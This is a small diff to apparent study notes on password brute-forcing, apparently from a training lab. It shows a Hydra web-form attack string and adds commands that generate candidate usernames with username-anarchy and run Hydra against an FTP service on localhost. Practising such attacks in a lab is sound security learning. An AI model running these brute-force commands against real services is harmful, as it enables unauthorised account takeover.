@@ -23,3 +23,12 @@ http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 
 ![[Pasted image 20241004150612.png]]
 
+```bash
+./username-anarchy Thomas Smith > usernames.txt
+```
+
+```bash
+hydra -L usernames.txt -P passwords.txt ftp://localhost
+```
+
+![[Pasted image 20241004152202.png]]
